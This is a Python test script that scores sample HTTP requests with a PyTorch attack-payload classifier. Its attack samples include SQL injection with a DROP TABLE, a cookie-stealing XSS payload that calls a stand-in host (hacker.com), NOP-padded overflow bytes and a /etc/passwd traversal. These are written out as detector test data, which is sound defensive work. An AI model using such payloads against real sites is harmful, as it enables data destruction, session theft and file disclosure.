import os
import sys
import torch
import torch.nn.functional as F
import random

# Ensure src is in path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "../")))

from src.mnemosyne.model import PayloadClassifier

MODEL_PATH = "d:/Argus_AI/models/payload_classifier.pth"

# Load the classifier
model = PayloadClassifier().to(torch.device('cpu'))
model.load_state_dict(torch.load(MODEL_PATH, map_location='cpu'))
model.eval()

def classify_payload(payload_bytes: bytes) -> float:
    """Return probability that the payload is an attack (0.0‑1.0)."""
    # Pad / truncate to 1024 bytes and normalize
    data = list(payload_bytes[:1024])
    if len(data) < 1024:
        data += [0] * (1024 - len(data))
    tensor = torch.tensor(data, dtype=torch.float32) / 255.0
    tensor = tensor.unsqueeze(0).unsqueeze(0)  # [1, 1, 1024]
    with torch.no_grad():
        logits = model(tensor)
        probs = F.softmax(logits, dim=1)
        # probability of the "attack" class (index 1)
        return probs[0, 1].item()

# Helper for colored output
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RESET = "\033[0m"

def color_for_score(score: float) -> str:
    if score > 0.7:
        return RED
    if score > 0.4:
        return YELLOW
    return GREEN


def test(name: str, payload: bytes):
    score = classify_payload(payload)
    color = color_for_score(score)
    print(f"[{name.ljust(20)}] Attack Prob: {color}{score:.4f}{RESET}")
    return score


def main():
    print("::: REAL‑WORLD CLASSIFIER TEST :::")
    print()
    # Normal traffic (similar to training)
    normal_req = b"GET /index.html HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
    test("Normal Request", normal_req)

    normal_post = b"POST /login HTTP/1.1\r\nHost: example.com\r\n\r\nusername=admin&password=password123"
    test("Normal API Call", normal_post)

    print("-" * 40)

    # Attack payloads
    sqli = b"GET /search?q=' OR '1'='1'; DROP TABLE users; -- HTTP/1.1\r\nHost: target.com\r\n\r\n"
    test("SQL Injection", sqli)

    xss = b"POST /comment HTTP/1.1\r\n\r\n<script>document.location='http://hacker.com/?c='+document.cookie</script>"
    test("XSS Payload", xss)

    buffer_overflow = b"A" * 500 + b"\x90\x90\x90\x90" + os.urandom(100)
    test("Buffer Overflow", buffer_overflow)

    traversal = b"GET /../../../../etc/passwd HTTP/1.1\r\nHost: target.com\r\n\r\n"
    test("Path Traversal", traversal)

if __name__ == "__main__":
    main()
